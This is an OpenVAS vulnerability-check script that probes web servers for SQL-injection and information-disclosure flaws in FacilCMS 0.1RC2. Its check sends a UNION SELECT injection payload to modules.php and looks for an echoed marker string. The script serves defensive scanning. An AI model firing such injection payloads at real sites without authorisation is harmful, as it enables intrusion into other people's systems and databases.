###############################################################################
# OpenVAS Vulnerability Test
# $Id: FacilCMS_multiple_vuln.nasl 11449 2018-09-18 10:04:42Z mmartin $
#
# FacilCMS Multiple SQL Injection And Information Disclosure
# Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100065");
  script_version("$Revision: 11449 $");
  script_tag(name:"last_modification", value:"$Date: 2018-09-18 12:04:42 +0200 (Tue, 18 Sep 2018) $");
  script_tag(name:"creation_date", value:"2009-03-20 13:11:29 +0100 (Fri, 20 Mar 2009)");
  script_bugtraq_id(34177);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("FacilCMS Multiple SQL Injection and Information Disclosure Vulnerabilities");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"FacilCMS is prone to multiple SQL-injection and
  information-disclosure vulnerabilities.

  Exploiting these issues could allow an attacker to obtain sensitive
  information, compromise the application, access or modify data, or
  exploit latent vulnerabilities in the underlying database.

  FacilCMS 0.1RC2 is vulnerable; other versions may also be affected.");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34177");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/facil-cms", "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/modules.php?modload=Albums&op=photo&id=-1+UNION+SELECT+1,2,3,0x53514c2d496e6a656374696f6e2d54657374%20--");

  if(http_vuln_check(port:port, url:url,pattern:"SQL-Injection-Test")) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
